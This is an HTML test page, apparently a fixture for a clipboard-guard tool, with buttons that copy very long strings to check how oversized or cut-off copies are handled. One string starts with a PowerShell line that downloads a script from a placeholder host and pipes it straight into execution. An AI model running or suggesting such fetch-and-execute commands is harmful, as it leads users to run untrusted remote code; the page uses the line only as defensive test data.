<!doctype html><meta charset="utf-8"><title>Docs: long copies</title>
<h1>Long copies</h1>
<p>Two harmless copy buttons. Nothing here runs anything.</p>
<button id="long-installer">Copy a long install script</button>
<button id="huge">Copy a very long text</button>
<script>
// A real-looking installer line followed by 3,000 comment lines (about 60,000
// characters), so a cut-off "Copy anyway" would be easy to spot.
const longInstaller = 'irm https://get.example.invalid/install.ps1 | iex\n' +
  Array.from({ length: 3000 }, (_, i) => '# step ' + i + ': nothing to see here').join('\n');
// 250,000 characters of plain text: more than the 200,000 the guard checks.
const huge = 'lorem ipsum dolor sit amet '.repeat(9260).slice(0, 250000);
window.CFA_TEST = { longInstaller, huge };
for (const [id, text] of [['long-installer', longInstaller], ['huge', huge]]) {
  document.getElementById(id).addEventListener('click', async () => {
    await navigator.clipboard.writeText(text);
    document.title = 'copied ' + id;
  });
}
</script>
